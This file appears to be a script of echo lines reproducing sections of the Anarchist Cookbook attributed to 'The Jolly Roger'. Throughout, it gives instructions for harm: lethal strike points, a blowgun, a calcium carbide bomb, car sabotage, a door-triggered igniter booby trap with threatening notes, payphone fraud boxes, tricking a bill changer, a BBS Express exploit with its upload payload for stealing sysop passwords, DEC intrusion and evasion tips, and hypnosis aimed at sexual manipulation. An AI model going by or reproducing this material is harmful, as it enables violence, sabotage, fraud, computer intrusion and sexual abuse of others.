echo Temple: There is a large artery up here, and if you hit it hard enough, it will cause death. If you manage to knock your enemy down, kick him in
echo the temple, and he'll never get up again.
echo Back of the Neck: A rabbit punch, or blow delivered to the base of the neck can easily break it, but to be safe, it is better to use the butt of a
echo gun or some other heavy blunt object.
echo Upper lip: A large network of nerves are located. These nerves are extremely close to the skin. A sharp upward blow will cause extreme pain,
echo and unconsciousness.
echo Ears: Coming up from behind an enemy and cupping the hands in a clapping motion over the victims ears can kill him immediately. The vibrations
echo caus ed from the clapping motion will burst his eardrums, and cause internal bleeding in the brain.
echo Groin: A VERY vulnerable spot. If left open, get it with knee hard, and he'll buckle over very fast.
echo Kidneys: A large nerve that branches off to the spinal cord comes very close to the skin at the kidneys. A direct blow with the knife edge of
echo your hand can cause death.
echo There are many more ways to kill and injure an enemy, but these should work best for the average person. This is meant only as information
echo and I would not recommend that you use this for a simple High School Brawl. Use these methods only, in your opinion, if your life is in danger.
echo Any one of these methods could very easily kill or cause permanent damage to someone. One more word of caution, you should practice
echo these moves before using them on a dummy, or a mock battle with a friend. (You don't have to actually hit him to practice, just work on
echo accuracy.)

echo 44. Blowgun by The Jolly Roger
echo In this article I shall attempt to explain the use and manufacture of a powerful blow -gun and making darts for the gun. The possession of the
echo blow gun described in this article IS a felony. So be careful where you use it. I don't want to get you all busted.
echo Needed:
echo 1.Several strands of yarn (About 2 inches a-piece).
echo 2.A regular pencil.
echo 3.A 2 ¬ inch long needle (hopefully with a beaded head. If not obtainable, wrap tape around end of needle.
echo 4.¬ foot pipe. (PVC or Aluminum) Half a inch in diameter.
echo Constructing the dart:
echo 1.Carefully twist and pull the metal part (Along with eraser) of the pencil till it comes off.
echo 2.Take Pin and start putting about 5-7 Strands of yarn on the pin. Then push them up to the top of the pin. But not over the head of the pin (or
echo the tape).
echo 3.Push pin through the hollow part of the head where the pencil was before.
echo 4.That should for a nice looking dart. (see illustration)
echo "#####"
echo ">>>>>-----/ # is the yarn"
echo "> is the head of the pencil"
echo "- is the pin it-self"
echo "/ is the head of the pin"
echo Using the Darts:
echo 1.Now take the finished dart and insert it in the tube (if it is too small put on more yarn.)
echo 2.Aim the tube at a door, wall, sister, ect.
echo 3.Blow on the end of the pipe.
echo 4.Sometimes the end of the pipe may be sharp. When this happens I suggest you wrap it with some black electrician tape. It should feel a lot

echo 46. Calcium Carbide Bomb by The Jolly Roger
echo This is EXTREMELY DANGEROUS. Exercise extreme caution.... Obtain some calcium carbide. This is the stuff that is used in carbide lamps and
echo can be found at nearly any hardware store. Take a few pieces of this stuff (it looks like gravel) and put it in a glass jar with some water. Put a

echo Eventually the glass with explode from internal pressure. If you leave a burning rag nearby, you will get a nice fireball

echo How to have phun with someone else's car. If you really detest someone, and I mean detest, here's a few tips on what to do in your spare
echo time. Move the windshield wiper blades, and insert and glue tacks. The tacks make lovely designs. If your "friend" goes to school with you,
echo Just before he comes out of school. Light a lighter and then put it directly underneath his car door handle. Wait...Leave...Listen. When you
echo hear a loud "shit!", you know he made it to his car in time. Remove his muffler and pour approximately 1 Cup of gas in it. Put the muffler back,
echo then wait till their car starts. Then you have a cigarette lighter. A 30 foot long cigarette lighter. This one is effective, and any fool can do it.
echo Remove the top air filter. That's it! Or a oldie but goodie: sugar in the gas tank. Stuff rags soaked in gas up the exhaust pipe. Then you wonder
echo why your "friend" has trouble with his/her lungs. Here's one that takes time and many friends. Take his/her car then break into their house
echo and reassemble it, in their living or bedroom. Phun eh? If you're into engines, say eeni mine moe and point to something and remove it. They
echo wonder why something doesn't work. There are so many others, but the real good juicy ones come by thinking hard.

echo 1 or 5 dollar bill? Well then, here is an article for you.
echo 1.Find the type of change machine that you slide in your bill length wise, not the type where you put the bill in a tray and then slide the tray in!!!
echo 2.After finding the right machine, get a $1 or $5 bill. Start crumpling up into a ball. Then smooth out the bill, now it should have a very wrinkly
echo surface.
echo 3.Now the hard part. You must tear a notch in the bill on the left side about « inch below the little 1 dollar symbol (See Figure).
echo 4.If you have done all of this right then take the bill and go out the machine. Put the bill in the machine and wait. What should happen is: when
echo you put your bill in the machine it thinks everything is fine. When it gets to the part of the bill with the notch cut out, the machine will reject
echo the bill and (if you have done it right) give you the change at the same time!!! So, you end up getting your bill back, plus the change!! It might
echo take a little practice, but once you get the hang of it, you can get a lot of money!

echo 49. Clear Box Plans by The Jolly Roger
echo The clear box is a new device which has just been invented that can be used throughout Canada and rural United States. The clear box works 
echo on "PostPay" payphones (fortress fones). Those are the payphones that don't require payment until after the connection is established. You 
echo pick up the fone, get a dial tone, dial your number, and then insert your money after the person answers. If you don't deposit the money then 
echo you can not speak to the person on the other end because your mouth piece is cut off but not the ear-piece. (obviously these phones are nice 
echo for free calls to weather or time or other such recordings). All you must do is to go to your nearby Radio Shack, or electronics store, and get a 
echo four-transistor amplifier and a telephone suction cup induction pick-up. The induction pick-up would be hooked up as it normally would to 
echo record a conversation, except that it would be plugged into the output of the amplifier and a microphone would be hooked to the input. So when 
echo the party that is being called answers, the caller could speak through the little microphone instead. His voice then goes through the amplifier 
echo and out the induction coil, and into the back of the receiver where it would then be broadcast through the phone lines and the other party 
echo would be able to hear the caller. The Clear Box thus 'clears up' the problem of not being heard. Luckily, the line will not be cut-off after a certain 
echo amount of time because it will wait forever for the coins to be put in. The biggest advantage for all of us about this new clear box is the fact 
echo that this type of payphone will most likely become very common. Due to a few things: 1st, it is a cheap way of getting the DTF, dial-tone-first 
echo service, 2nd, it doesn't require any special equipment, (for the phone company) This payphone will work on any phone line. Usually a 
echo payphone line is different, but this is a regular phone line and it is set up so the phone does all the charging, not the company.

echo 51. Electronic Terrorism by The Jolly Roger
echo 1.It starts when a big, dumb lummox rudely insults you. Being of a rational, intelligent disposition, you wisely choose to avoid a (direct) 
echo confrontation. But as he laughs in your face, you smile inwardly ---your revenge is already planned.
echo 2.Follow your victim to his locker, car, or house. Once you have chosen your target site, lay low for a week or more, letting your anger boil.
echo 3.In the mean time, assemble your versatile terrorist kit(details below.)
echo 4.Plant your kit at the designated target site on a Monday morning between the hours of 4:00 am and 6:00 am. Include a calm, suggestive note 
echo that quietly hints at the possibility of another attack. Do not write it by hand "don't be such a jerk, or the 
echo next one will take off your hand. Have a nice day." Notice how the calm tone instills fear. As if written by a homicidal psychopath.
echo 5.Choose a strategic location overlooking the target site. Try to position yourself in such a way that you can see his facial contortions.
echo 6.Sit back and enjoy the fireworks the parts you'll need are:
echo · 4 AA batteries
echo · 1 9-volt battery
echo · 1 SPDT mini relay (radio shack)
echo · 1 rocket engine(smoke bomb or m-80)
echo · 1 solar igniter (any hobby store)
echo · 1 9-volt battery connector
echo 1.Take the 9-volt battery and wire it through the relay's coil. This circuit should also include a pair of contacts that when separated cut off this 
echo circuit. These contacts should be held together by trapping them between the locker, mailbox, or car door. Once the door is opened, the 
echo contacts fall apart and the 9-volt circuit is broken, allowing the relay to fall to the closed position thus closing the ignition circuit. (If all this 
echo is confusing take a look at the schematic below.)
echo 2.Take the 4 AA batteries and wire them in succession. Wire the positive terminal of one to the negative terminal of another, until all four are 
echo connected except one positive terminal and one negative terminal. Even though the four AA batteries only combine to create 6 volts, the 
echo increase in amperage is necessary to activate the solar igniter quickly and effectively.
echo 3.Take the battery pack (made in step 2) and wire one end of it to the relay's single pole and the other end to one prong of the solar igniter. 
echo Then wire the other prong of the solar igniter back to the open position on the relay.
echo 4.Using double sided carpet tape mount the kit in his locker, mailbox, or car door. And last, insert the solar igniter into the rocket engine (smoke 
echo bomb or m-80).

echo This method of starting the conf. Depends on your ability to bullshit the operator into dialing a number which can only be reached with an 
echo operator's M-F tones. When bullshitting the operator remember operator's are not hired to think but to do.
echo Here is a step-by-step way to the conf.:
echo Call the operator through a pbx or extender, you could just call one Through your line but I wouldn't recommend it.
echo Say to the operator: TSPS maintenance engineer, ring-forward to 213+080+1100, position release, thank you.(she will probably ask you for 
echo the number again) Definitions: 
echo Ring-forward instructs her to dial the number.
echo Position release instructs her to release the trunk after she has dialed the number.
echo + - remember to say 213plus080 plus1100.
echo 3. When you are connected with the conf. You will here a whistle blow twice and a recording asking you for your operator number. Dial in any 
echo five digits and hit the pounds sign a couple of times. Simply dial in the number of the billing line ect. When the recording ask for it. When in the 
echo control mode of the conf. Hit '6' to transfer control. Hit '001' to reenter the number of conferee's and time amount which you gave when you 
echo stared the conf. Remember the size can be from 2-59 conferee's. I have not found out the 'lengths' limits.

echo 55. Breaking into BBS Express by The Jolly Roger
echo If you have high enough access on any BBS Express BBS you can get the Sysop's password without any problems and be able to log on as 
echo him and do w hatever you like. Download the Pass file, delete the whole BBS, anything. Its all a matter of uploading a text file and downloading it 
echo from the BBS. You must have high enough access to see new uploads to do this. If you can see a file you just uploaded you have the ability to 
echo break into the BBS in a few easy steps. Why am I telling everyone this when I run BBS Express myself? Well there is one way to stop this from 
echo happening and I want other Sysops to be aware of it and not have it happen to them. Breaking in is all based on the MENU function of BBS 
echo Express. Express will let you create a menu to display different text files by putting the word MENU at the top of any text file and stating what 
echo files are to be displayed. But due to a major screw up by Mr. Ledbetter you can use this MENU option to display the USERLOG and the Sysop's 
echo Passwords or anything else you like. I will show you how to get the Sysop's pass and therefore log on as the Sysop. BBs Express Sysop's 
echo have 2 passwords. One like everyone else gets in the form of X1XXX, and a Secondary password to make it harder to hack out the Sysops 
echo pass. The Secondary pass is found in a file called SYSDATA.DAT. This file must be on drive 1 and is therefore easy to get. 
echo All you have to do is upload this simple Text file:
echo MENU
echo 1
echo D1:SYSDATA.DAT
echo Rip-off time
echo After you upload this file you download it non-Xmodem. Stupid Express thinks
echo it is displaying a menu and you will see this:
echo Rip-off time
echo Selection [0]:
echo Just hit 1 and Express will display the SYSDATA.DAT file. OPPASS is where the Sysop's Secondary pass will be. D1:USERLOG.DAT is where 
echo you will find the name and Drive number of the USERLOG.DAT file. The Sysop might have renamed this file or put it in a Subdirectory or even 
echo on a different drive. I Will Assume he left it as D1:USERLOG.DAT. The other parts of this file tell you where the .HLP screens are and where 
echo the LOG is saved and all the Download path names.
echo Now to get the Sysop's primary pass you upload a text file like this:
echo MENU
echo 1
echo D1:USERLOG.DAT
echo Breaking into Bedwetter's BBS
echo Again you then download this file non-Xmodem and you will see:
echo Breaking into Bedwetter's BBS
echo Selection [0]:
echo You then hit 1 and the long USERLOG.DAT file comes flying at you. The Sysop is the first entry in this very long file so it is easy. You will see:
echo SYSOP'S NAME X1XXX
echo You should now have his 2 passwords.
echo There is only one easy way out of this that I can think of, and that is to make all new uploads go to SYSOP level (Level 9) access only. This 
echo way nobody can pull off what I just explained. I feel this is a major Bug on Mr. Ledbetter's part. I just don't know why no one had thought of it 
echo before. I would like to give credit to Redline for the message he left on Modem Hell telling about this problem, and also to Unka for his ideas and

echo 59. Green Box Plans by the Jolly Roger
echo Paying the initial rate in order to use a red box (on certain fortresses) left a sour taste in many red boxers mouths, thus the green box was 
echo invented. The green box generates useful tones such as COIN COLLECT, COIN RETURN, AND RINGBACK. These are the tones that ACTS or 
echo the TSPS operator would send to the CO when appropriate. Unfortunately, the green box cannot be used at the fortress station but must be 
echo used by the CALLED party.
echo Here are the tones:
echo COIN COLLECT 700+1100hz
echo COIN RETURN 1100+1700hz
echo RINGBACK 700+1700hz
echo Before the called party sends any of these tones, an operator release signal should be sent to alert the MF detectors at the CO. This can be 
echo done by sending 900hz + 1500hz or a single 2600 wink (90 ms.) Also do not forget that the initial rate is collected shortly before the 3 minute 
echo period is up. Incidentally, once the above MF tones for collecting and returning coins reach the CO, they are converted into an appropriate DC 
echo pulse (-130 volts for return and +130 for collect). This pulse is then sent down the tip to the fortress. This causes the coin relay to either return 
echo or collect the coins. The alleged "T-network" takes advantage of this information. When a pulse for coin collect (+130 VDC) is sent down the 
echo line, it must be grounded somewhere. This is usually the yellow or black wire. Thus, if the wires are exposed, these wires can be cut to 
echo prevent the pulse from being grounded. When the three minute initial period is almost up, make sure that the black and yellow wires are 
echo severed, then hang up, wait about 15 seconds in case of a second pulse, reconnect the wires, pick up the phone, and if all goes well, it 
echo should be "JACKPOT" time.

echo 61. Hacking Tutorial by The Jolly Roger
echo What is hacking?
echo According to popular belief the term hacker and hacking was founded at MIT it comes from the root of a hack writer, someone who keeps 
echo "hacking" at the typewriter until he finishes the story. A computer hacker would be hacking at the keyboard or password works.
echo What you need:
echo To hack you need a computer equipped with a modem (a device that lets you transmit data over phone lines) which should cost you from $100 
echo to $1200.
echo How do you hack?
echo Hacking requires two things:
echo 1.The phone number.
echo 2.Answer to identity elements.
echo How do you find the phone number?
echo There are three basic ways to find a computers phone number:
echo 1.Scanning
echo 2.Directory
echo 3.Inside info
echo What is scanning?
echo Scanning is the process of having a computer search for a carrier tone. For example, the computer would start at (800) 111-1111 and wait for 
echo carrier if there is none it will go on to 111-1112 etc. If there is a carrier it will record it for future use and continue looking for more.
echo What is directory assistance?
echo This way can only be used if you know where your target computer is. For this
echo example say it is in menlo park, CA and the company name is Sri.
echo 1.Dial 411 (or 415-555-1212)
echo 2.Say "Menlo park"
echo 3.Say "Sri"
echo 4.Write down number
echo 5.Ask if there are any more numbers
echo 6.If so write them down.
echo 7.Hang up on operator
echo 8.Dial all numbers you were given
echo 9.Listen for carrier tone
echo 10.If you hear carrier tone write down number, call it on your modem and your set to hack

echo 62. The Basics of Hacking II by The Jolly Roger
echo Basics to know before doing anything, essential to your continuing career as one of the elite in the country... This article, "The introduction to 
echo the world of hacking." is meant to help you by telling you how not to get caught, what not to do on a computer system, what type of equipment 
echo should I know about now, and just a little on the history, past present future, of the hacker.
echo Welcome to the world of hacking We, the people who live outside of the normal rules, and have been scorned and even arrested by those 
echo from the 'civilized world', are becoming scarcer every day. This is due to the greater fear of what a good hacker (skill wise, no moral 
echo judgments here) can do nowadays, thus causing anti- hacker sentiment in the masses. Also, few hackers seem to actually know about the 
echo computer systems they hack, or what equipment they will run into on the front end, or what they could do wrong on a system to alert the 
echo 'higher' authorities who monitor the system. This article is intended to tell you about some things not to do, even before you get on the system. I 
echo will tell you about the new wave of front end security devices that are beginning to be used on computers. I will attempt to instill in you a 
echo second identity, to be brought up at time of great need, to pull you out of trouble. And, by the way, I take no, repeat, no, responsibility for what 
echo we say in this and the forthcoming articles.
echo Enough of the bullshit, on to the fun: after logging on your favorite bbs, you see on the high access board a phone number It says it's a great 
echo system to "fuck around with try to avoid calling a 
echo number given to the public. This is because there are at least every other user calling, and how many other boards will that number spread to? 
echo If you call a number far, far away, and you plan on going through an extender or a re-seller, don't keep calling the same access number (I.E. 
echo As you would if you had a hacker running), this looks very suspicious and can make life miserable when the phone bill comes in the mail. Most 
echo cities have a variety of access numbers and services, so use as many as you can. Never trust a change in the system... The 414's, the 
echo assholes, were caught for this reason: when one of them connected to the system, there was nothing good there. The next time, there was a 
echo trek game stuck right in their way Nice 
echo job, don't you think? If anything looks suspicious, drop the line immediately if you 
echo use a little common sense, you won't get busted. Let the little kids who aren't smart enough to recognize a trap get busted, it will take the heat 
echo off of the real hackers. Now, let's say you get on a computer
echo system... It looks great, checks out, everything seems fine. OK, now is when it gets more dangerous. You have to know the computer system 
echo to know what not to do. Basically, keep away from any command something, copy a new file into the account, or whatever Always leave the 
echo account in the same status you logged in with. Change *nothing*... If it isn't an account with priv's, then don't try any commands that require 
echo them All, yes all, systems are going to be keeping log files of what users are doing, and that will show up. It is just like dropping a trouble-card 
echo in an ESS system, after sending that nice operator a pretty tone. Spend no excessive amounts of time on the account in one stretch. Keep your 
echo calling to the very late night if possible, or during business hours (believe it or not). It so happens that there are more users on during 
echo business hours, and it is very difficult to read a log file with 60 users doing many commands every minute. Try to avoid systems where 
echo everyone knows each other, don't try to bluff. And above all: never act like you own the system, or are the best there is. They always grab 
echo the people who's heads swell... There is some very interesting front end equipment around nowadays, but first let's define terms... By front 
echo end, we mean any device that you must pass through to get at the real computer. There are devices that are made to defeat hacker programs, 
echo and just plain old multiplexers. To defeat hacker programs, there are now devices that pick up the phone and just sit there... This means that 
echo your device gets no carrier, thus you think there isn't a computer on the other end. The only way around it is to detect when it was picked up. 
echo If it picks up after the same number ring, then you know it is a hacker-defeater. These devices take a multi-digit code to let you into the system. 
echo Some are, in fact, quite sophisticated to the point where it will also limit the user name's down, so only one name or set of names can be valid 
echo logins after they input the code... Other devices input a number code, and then they dial back a pre-programmed number for that code. These 
echo systems are best to leave alone, because they know someone is playing with their phone. You may think "but I'll just reprogram the dial-back." 
echo Think again, how stupid that is... Then they have your number, or a test loop if you were just a little smarter. If it's your number, they have your 
echo balls (if male...), if its a loop, then you are screwed again, since those loops
echo are *monitored*. As for multiplexers... What a plexer is supposed to do is this:
echo The system can accept multiple users. We have to time share, so we'll let the front-end processor do it... Well, this is what a multiplexer does. 
echo Usually they will ask for something like "enter class" or "line:". Usually it is programmed for a double digit number, or a four to five letter word. 
echo There are usually a few sets of numbers it accepts, but those numbers also set your 300/1200/2400 baud data type. These multiplexers are 
echo inconvenient at best, so not to worry. A little about the history of hacking: hacking, by my definition, means a great knowledge of some special 
echo area. Doctors and lawyers are hackers of a sort, by this definition. But most often, it is being used in the computer context, and thus we have 
echo a definition of "anyone who has a great amount of computer or telecommunications knowledge." You are not a hacker because you have a list 
echo of codes... Hacking, by my definition, has then been around only about 15 years. It started, where else but, MIT and colleges where they had 
echo computer science or electrical engineering departments. Hackers have created some of the best computer languages, the most awesome 
echo operating systems, and even gone on to make millions. Hacking used to have a good name, when we could honestly say "we know what we 
echo are doing". Now it means (in the public eye): the 414's, Ron Austin, the NASA hackers, the arpanet hackers... All the people who have been 
echo caught, have done damage, and are now going to have to face fines and sentences. Thus we come past the moralistic crap, and to our 
echo purpose: educate the hacker community, return to the days when people actually knew something...

echo 63. Hacking DEC's by The Jolly Roger
echo In this article you will learn how to log in to dec's, logging out, and all the fun stuff to do in-between. All of this information is based on a 
echo standard dec system. Since there are dec systems 10 and 20, and I favor, the dec 20, there will be more info on them in this article. It just so 
echo happens that the dec 20 is also the more common of the two, and is used by much more interesting people (if you know what I mean...) OK, 
echo the first thing you want to do when you are receiving carrier from a dec system is to find out the format of login names. You can do this by 
echo looking at who is on the system.
echo Dec''=>'' ` (the 'exec' level prompt)
echo you''=>'' sy
echo sy: short for sy(stat) and shows you the system status.
echo You should see the format of login names. A systat usually comes up in this form:
echo Job Line Program User
echo Job: The job number (not important unless you want to log them off later)
echo Line: What line they are on (used to talk to them...) These are both two or three digit numbers.
echo Program: What program are they running under? If it says 'exec' they aren't doing anything at all...
echo User: ahhhahhhh This is the user name they are logged in under... Copy the format, and hack yourself outa working code... Login format is as 
echo such:
echo dec''=>'' `
echo you''=>'' login username password
echo Username is the username in the format you saw above in the systat. After you hit the space after your username, it will stop echoing 
echo characters back to your screen. This is the password you are typing in... Remember, people usually use their name, their dog's name, the 
echo name of a favorite character in a book, or something like this. A few clever people have it set to a key cluster (qwerty or asdfg). Passwords 
echo can be from 1 to 8 characters long, anything after that is ignored. You are finally in... It would be nice to have a little help, wouldn't it? Just type 
echo a ? Or the word help, and it will give you a whole list of topics... Some handy characters for you to know would be the control keys, wouldn't 
echo it? Backspace on a dec 20 is rub which is 255 on your ASCII chart. On the dec 10 it is control-H. To abort a long listing or a program, control-C 
echo works fine. Use Control-O to stop long output to the terminal. This is handy when playing a game, but you don't want to control-C out. Control-T 
echo for the time. Control-u will kill the whole line you are typing at the moment. You may accidentally run a program where the only way out is a 
echo control-X, so keep that in reserve. Control-s to stop listing, control-Q to continue on both systems. Is your terminal having trouble?? Like, it 
echo pauses for no reason, or it doesn't backspace right? This is because both systems support many terminals, and you haven't told it what yours 
echo is yet... You are using a VT05 so you need to tell it you are one.
echo Dec''=>'' `
echo you''=>'' information terminal
echo -orYou''=>'' info
echo (This shows you what your terminal is set up as.)
echo Dec''=>''all sorts of shit, then the `
echo you''=>'' set ter vt05
echo (This sets your terminal type to VT05.)
echo Now let's see what is in the account (here after abbreviated acct.) that you have hacked onto. Say:
echo ''=>'' dir
echo (Short for directory.)
echo It shows you what the user of the code has save to the disk. There should be a format like this: xxxxx.Oooxxxxx is the file name, from 1 to 20 
echo characters long. Ooo is the file type, one of: exe, txt, dat, bas, cmd and a few others that are system dependant. Exe is a compiled program 
echo that can be run (just by typing its name at the `)
echo Txt is a text file, which you can see by typing:
echo ''=>''type xxxxx.Txt
echo Do not try to:
echo ''=>''type xxxxx.Exe 
echo (This is very bad for your terminal and will tell you absolutely nothing.)
echo Dat is data they have saved.
echo Bas is a basic program, you can have it typed out for you.
echo Cmd is a command type file, a little too complicated to go into here. Try:
echo ''=>''take xxxxx.Cmd
echo By the way, there are other users out there who may have files you can use.
echo (Gee, why else am I here?)
echo ''=>'' dir <*.*> (Dec 20)
echo ''=>'' dir [*,*] (Dec 10)
echo * is a wildcard, and will allow you to access the files on other accounts if the user has it set for public access. If it isn't set for public access, 
echo then you won't see it. To run that program:
echo dec''=>'' `
echo you''=>'' username program-name
echo Username is the directory you saw the file listed under, and file name was what else but the file name? ** You are not alone ** remember, you 
echo said (at the very start) sy short for systat, and how we said this showed the other users on the system? Well, you can talk to them, or at 
echo least send a message to anyone you see listed in a systat. You can do this by:
echo dec''=>'' the user list (from your systat)
echo you''=>'' talkusername (Dec 20)
echo  send username (Dec 10)
echo Talk allows you and them immediate transmission of whatever you/they type to be sent to the other. Send only allow you one message to be 
echo sent, and send, they will send back to you, with talk you can just keep going. By the way, you may be noticing with the talk command that what 
echo you type is still acted upon by the parser (control program). To avoid the constant error messages type either:
echo you''=>'' ;your message
echo you'=>' rem your message
echo the semi-colon tells the parser that what follows is just a comment. Rem is short for 'remark' and ignores you from then on until you type a 
echo control-Z or control-C, at which point it puts you back in the exec mode. To break the connection from a talk command type:
echo you'=>' break priv's:
echo If you happen to have privs, you can do all sorts of things. First of all, you have to activate those privs.
echo You'=>' enable
echo This gives you a $ prompt, and allows you to do this: whatever you can do to your own directory you can now do to any other directory. To 
echo create a new acct. Using your privs, just type:
echo '=>'build username
echo If username is old, you can edit it, if it is new, you can define it to be whatever you wish. Privacy means nothing to a user with privs. By the 
echo way, there are various levels of privs: operator, wheel, cia. Wheel is the most powerful, being that he can log in from anywhere and have his 
echo powers. Operators have their power because they are at a special terminal allowing them the privs. Cia is short for 'confidential information 
echo access', which allows you a low level amount of privs. Not to worry though, since you can read the system log file, which also has the 
echo passwords to all the other accounts.
echo To de-activate your privs, type:
echo you'=>' disable
echo when you have played your greedy heart out, you can finally leave the
echo system with the command:
echo '=>'logout
echo This logs the job you are using off the system (there may be varients of this such as kjob, or killjob.)

echo 64. Harmless Bombs by The Jolly Roger
echo To all those who do not wish to inflict bodily damage on their victims but only terror. These are weapons that should be used from high places.
echo 1.The Flour Bomb
echo Take a wet paper towel and pour a given amount of baking flour in the center. Then wrap it up and put on a rubber band to keep it together. 
echo When thrown it will fly well but when it hits, it covers the victim with the flower or causes a big puff of flour which will put the victim in 
echo terror since as far as they are concerned, some strange white powder is all over them. This is a cheap method of terror and for only the 
echo cost of a roll of paper towels and a bag of flour you and your friends can have loads of fun watching people flee in panic.
echo 2.Smoke Bomb Projectile
echo All you need is a bunch of those little round smoke bombs and a wrist rocket or any sling-shot. Shoot the smoke bombs and watch the terror 
echo since they think it will blow up
echo 3.Rotten Eggs (Good ones) 
echo Take some eggs and get a sharp needle and poke a small hole in the top of each one. Then let them sit in a warm place for about a week. Then 
echo you've got a bunch of rotten eggs that will only smell when they hit.
echo 4.Glow in the Dark Terror
echo Take one of those tubes of glow in the dark stuff and pour the stuff on whatever you want to throw and when it gets on the victim, they think 
echo it's some deadly chemical or a radioactive substance so they run in total panic. This works especially well with flower bombs since a 
echo gummy, glowing substance gets all over the victim.
echo 5.Fizzling Panic
echo Take a baggy of a water-baking soda solution and seal it. (Make sure there is no air in it since the solution will form a gas and you don't 
echo want it to pop on you.) Then put it in a bigger plastic bag and fill it with vinegar and seal it. When thrown, the two substances will mix and 
echo cause a violently bubbling substance to go all over the victim.

echo 66. A Guide to Hypnotism by The Jolly Roger
echo What hypnotism is?
echo Hypnotism, contrary to common belief, is merely state when your mind and body are in a state of relaxation and your mind is open to positive, 
echo or cleverly worded negative, influences. It is not a trance where you:
echo · Are totally influenceable.
echo · Cannot lie.
echo · A sleep which you cannot wake up from without help.
echo This may bring down your hope somewhat, but, hypnotism is a powerful for self help, and/or mischief.
echo Your subconscious mind
echo Before going in further, I'd like to state that hypnotism not only is great in the way that it relaxes you and gets you (in the long run) what you 
echo want, but also that it taps a force of incredible power, believe it or not, this power is your subconscious mind. The subconscious mind always 
echo knows what is going on with every part of your body, every moment of the day. It protects you from negative influences, and retains the 
echo power to slow your heartbeat down and stuff like that. The subconscious mind holds just about all the info you would like to know
echo About yourself, or, in this case, the person you will be hypnotizing. There are many ways to talk to your subconscious and have it talk back to 
echo you. One way is the ouja board, no its not a spirit, merely the minds of those who are using it. Another, which I will discuss here, is the 
echo pendulum method. OK, here is how it goes. First, get a ring or a washer and tie it to a thread a little longer than half of your forearm. Now, 
echo take a sheet of paper and draw a big circle in it. In the big circle you must now draw a crosshair (a big +). Now, put the sheet of paper on a 
echo table. Next, hold the thread with the ring or washer on it and place it (holding the thread so that the ring is 1 inch above the paper swinging) in 
echo the middle of the crosshair. Now, swing the thread so the washer goes up and down, say to yourself the word "Yes" now, do it side to side 
echo and say the word "no". Do it counter clockwise and say "I don't know". And lastly, do it clockwise and say "I don't want to say." Now, with the 
echo thread back in the middle of the crosshair, ask yourself questions and wait for the pendulum to swing in the direction for the answer. (yes, no, 
echo I don't know or I don't want to say...). Soon, to your amazement, it will be answering questions like anything... Let the pendulum answer, don't 
echo try.. When you try you will never get an answer. Let the answer come to you.
echo How to induce hypnotism
echo Now that you know how to talk to your subconscious mind, I will now tell you how to guide someone into hypnosis. Note that I said guide, you 
echo can never, hypnotize someone, they must be willing. OK, the subject must be lying or sitting in a comfortable position, relaxed, and at a time 
echo when things aren't going to be interrupted. Tell them the following or something close to it, in a peaceful, monotonous tone (not a commanding 
echo tone of voice)
echo Note: Light a candle and place it somewhere where it can be easily seen.
echo "Take a deep breath through your nose and hold it in for a count of 8. Now, through your mouth, exhale completely and slowly. Continued 
echo breathing long, deep, breaths through your nose and exhaling through your mouth. Tense up all your muscles very tight, now, counting from 
echo ten to one, release them slowly, you will find them very relaxed. Now, look at the candle, as you look at it, with every breath and passing 
echo moment, you are feeling increasingly more and more peaceful and relaxed. The candles flame is peaceful and bright. As you look at it I will 
echo count from 100 down, as a count, your eyes will become more and more relaxed, getting more and more tired with each passing moment." 
echo Now, count down from 100, about every 10 numbers say "When I reach xx your eyes (or you will find your eyes) are becoming more and 
echo more tired." Tell them they may close their eyes whenever they feel like it. If the persons eyes are still open when you get to 50 then instead 
echo of saying "your eyes will.." Say "your eyes are...". When their eyes are shut say the following. As you lie (or sit) here with your eyes 
echo comfortably close you find yourself relaxing more and more with each moment and breath. The relaxation feels pleasant and blissful so, you 
echo happily give way to this wonderful feeling. Imagine yourself on a cloud, resting peacefully, with a slight breeze caressing your body. A tingling 
echo sensation begins to work its way, within and without your toes, it slowly moves up your feet, making them warm, heavy and relaxed. The 
echo cloud is soft and supports your body with its soft texture, the scene is peaceful and absorbing, the peacefulness absorbs you completely. The 
echo tingling gently and slowly moves up your legs, relaxing them. Making them warm and heavy. The relaxation feels very good, it feels so good to 
echo relax and let go. As the tingling continues its journey up into your solar plexus, you feel your inner stomach become very relaxed. Now, it 
echo moves slowly into your chest, making your breathing relaxed as well. The feeling begins to move up your arms to your shoulders, making your 
echo arms heavy and relaxed as well. You are aware of the total relaxation you are now experiencing, and you give way to it. It is good and 
echo peaceful, the tingling now moves into your face and head, relaxing your jaws, neck, and facial muscles, making your cares and worries float 
echo away. Away into the blue sky as you rest blissfully on the cloud. If they are not responsive or you think they (he or she) is going to sleep, then 
echo add in a "...always concentrating upon my voice, ignoring all other sounds. Even though other sounds exists, they aid you in your relaxation..." 
echo They should soon let out a sigh as if they were letting go, and their face should have a "woodiness" to it, becoming featureless... Now, say the 
echo following "... You now find yourself in a hallway, the hallway is peaceful and nice. As I count from 10 to 1 you will imagine yourself walking 
echo further and further down the hall. When I reach one you will find yourself where you want to be, in another, higher state of conscious and 
echo mind. (count from ten to one)..." Do this about three or four times. Then, to test if the subject is under hypnosis or not, say "... You feel a 
echo strange sensation in your (arm they write with) arm, the feeling begins at your fingers and slowly moves up your arm, as it moves through 
echo your arm your arm becomes lighter and lighter, it will soon be so light it will ... becoming lighter and lighter which each breath and moment..." 
echo Their fingers should begin to twitch and then move up, the arm following, now my friend, you have him/her in hypnosis. The first time you do 
echo this, while he/she is under say good things, like: "Your going to feel great tomorrow" or "Every day in every way you will find yourself 
echo becoming better and better".. Or some crap like that... The more they go under, the deeper in hypnosis they will get each time you do it.
echo What to do when hypnotized
echo When you have them under you must word things very carefully to get your way. You cannot simply say... Take off your clothes and fuck the 
echo pillow. No, that would not really do the trick. You must say something like.... "you find your self at home, in your room and you have to take a 
echo shower (vividly describe their room and what's happening), you begin to take off your clothes..." Now, it can't be that simple, you must know 
echo the persons house, room, and shower room. Then describe things vividly and tell them to act it out (they have to be deeply under to do this). I 
echo would just suggest that you experiment a while, and get to know how to do things. 
echo Waking up
echo Waking up is very easy, just say "...as I count from 1 to 5 you will find yourself becoming more and more awake, more and more lively. When 
echo you wake up you will find yourself completely alive, awake, and refreshed. Mentally and physically, remembering the pleasant sensation that 
echo hypnosis brings... Waking up feeling like a new born baby, reborn with life and vigor, feeling excellent. Remembering that next time you enter 
echo hypnosis it will become an ever increasing deeper and deeper state than before.
echo 1.You feel energy course throughout your limbs.
echo 2.You begin to breathe deeply, stirring.
echo 3.Beginning to move more and more your eyes open, bringing you up to full conscious.
echo 4.You are up, up, up and awakening more and more.
echo 5.You are awake and feeling great.
